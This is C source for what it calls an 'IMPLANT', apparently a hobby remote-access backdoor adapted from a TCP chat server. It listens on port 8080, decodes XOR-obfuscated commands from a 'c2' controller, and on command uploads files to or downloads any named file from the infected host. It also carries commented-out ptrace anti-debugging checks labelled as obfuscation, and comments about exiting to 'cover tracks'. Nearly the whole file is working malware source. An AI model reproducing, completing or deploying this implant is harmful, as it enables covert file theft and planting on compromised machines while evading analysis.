//IMPLANT code  based off personal TCP IP project
#include <stdio.h> 
#include <netdb.h> 
#include <netinet/in.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <unistd.h> // read(), write(), close()
#include <pthread.h>
#include <arpa/inet.h> 
#include <dirent.h> // Required for directory operations for files
#include <sys/ptrace.h>

#define MAX 80 
#define PORT 8080 
#define SA struct sockaddr 


// Structure to hold client information
typedef struct {
    int client_id;
    int conn;
    struct sockaddr_in client_addr;
} client_info;

client_info* clients[100];  
int client_count = 0;

pthread_mutex_t clients_lock;




void* encryptDecrypt(char* inpString) 
{ 
    // Define XOR key 
    // Any character value will work 
    char xorKey = 'P'; 
  
    // calculate length of input string 
    int len = strlen(inpString); 
  
    // perform XOR operation of key 
    // with every character in string 
    for (int i = 0; i < len; i++) 
    { 
        inpString[i] = inpString[i] ^ xorKey; 
        printf("%c",inpString[i]); 
    } 
    
}

void receive_clientsent_file(int conn, char *file_name) {
    char buffer[MAX];
    char file_path[MAX];

    snprintf(file_path, sizeof(file_path), "%s", file_name);
    FILE *file = fopen(file_path, "wb");
    if (file == NULL) {
        return;
    }
    

    char* ACK = "ACK";
    encryptDecrypt(ACK);
    write(conn, ACK, 4);

    while (1) {
        bzero(buffer, sizeof(buffer));
        int bytes_read = read(conn, buffer, sizeof(buffer));
        if (bytes_read <= 0 || strncmp(buffer, "EOF", 3) == 0) {
            break;
        }

        fwrite(buffer, 1, bytes_read, file);
    }

    fclose(file);
}

void *send_requested_file(int conn, char *file_name) {
    char buffer[MAX];
    //char file_path[MAX];

    //snprintf(file_path, sizeof(file_path), "txtfiles/%s", file_name);
    FILE *file = fopen(file_name, "rb");
    if (file == NULL) {
        return NULL;
    }

    while (!feof(file)) {
	bzero(buffer, sizeof(buffer));
        int bytes_read = fread(buffer, 1, sizeof(buffer), file);
        if (bytes_read > 0) {
            int bytes_sent = write(conn, buffer, bytes_read);
            if (bytes_sent < 0) {
                exit(0);
            }
        } else if (ferror(file)) {
            exit(0);
        }
    }
    sleep(1);
    char eof[] = "EOF";
    // Inform client that file transfer is complete
    write(conn, eof, 3);
    fclose(file);
    
}


void *medium(void* client_info_ptr) 
{ 
    char buff[MAX]; 
    int n; 

    client_info *client = (client_info *)client_info_ptr;
    int conn = client->conn;
    int client_id = client->client_id;

    
    // Infinite loop for communication 
    for (;;) {

	// Obfuscation method: Immediately exit if being run in debugger in event gdb is being run in it mid execution
   	 //if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1)
  	//	exit(0);

        bzero(buff, MAX); 
        int bytes_read = read(conn, buff, sizeof(buff)); 
        if (bytes_read <= 0) {
            exit(0);
        }

	encryptDecrypt(buff);       

        if (strncmp(buff, "SEND_FILE", 9) == 0) { // c2 sends file to implant
            char *file_name = buff + 10;
            receive_clientsent_file(conn, file_name);
        }

        else if (strncmp(buff, "RECV_FILE", 9) == 0) { // implant sends file to client
            char *file_name = buff + 10;
            send_requested_file(conn, file_name);
        }

        else {
	    exit(0);
        }
    }
         
    pthread_mutex_lock(&clients_lock);
    for (int i = 0; i < client_count; i++) {
        if (clients[i]->conn == conn) {
            clients[i] = clients[client_count - 1];
            client_count--;
            break;
        }
    }
    pthread_mutex_unlock(&clients_lock);

    close(conn);
    free(client);
    return NULL;
}


// Main driver function
void start_chatroom_serverside(int port) 
{ 
// Obfuscation method: Immediately exit if being run in debugger
    //if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1)
  //	exit(0);

    int sockfd, conn, len; 
    struct sockaddr_in servaddr, cli; 
    int opt = 1;

    pthread_mutex_init(&clients_lock, NULL);
   
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
        exit(0); 
    } 

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        exit(0);
    }

    bzero(&servaddr, sizeof(servaddr)); 
   
    servaddr.sin_family = AF_INET; 
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
    servaddr.sin_port = htons(PORT); 
   
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) { 
        exit(0); 
    } 
   
    if ((listen(sockfd, 5)) != 0) { 
        exit(0); 
    } 

    len = sizeof(cli); 
   
    while (1) {
        conn = accept(sockfd, (SA*)&cli, &len); 
        if (conn < 0) {
            exit(0); 
        } 
   
        // Create a new thread to handle this client connection
        pthread_t thread_id;

        // Allocate memory for client information exit if failed to cover tracks
        client_info *client = malloc(sizeof(client_info));
        if (!client) {
            close(conn);
            exit(0);
        }

        // Assign a unique ID to this client
        pthread_mutex_lock(&clients_lock);
        client->client_id = client_count;
        client->conn = conn;
        client->client_addr = cli;

        clients[client_count++] = client;
        pthread_mutex_unlock(&clients_lock);

        pthread_create(&thread_id, NULL, medium, client);
        pthread_detach(thread_id);
    }
   
    // Close the socket (will not be reached unless the server is shut down)
    close(sockfd); 
    pthread_mutex_destroy(&clients_lock);
    exit(0);
    }




int main() {
    // Obfuscation method: Immediately exit if being run in debugger
    //if (ptrace(PTRACE_TRACEME, 0, NULL, 0) == -1)
  //	exit(0);
    start_chatroom_serverside(PORT);
    return 0;
}
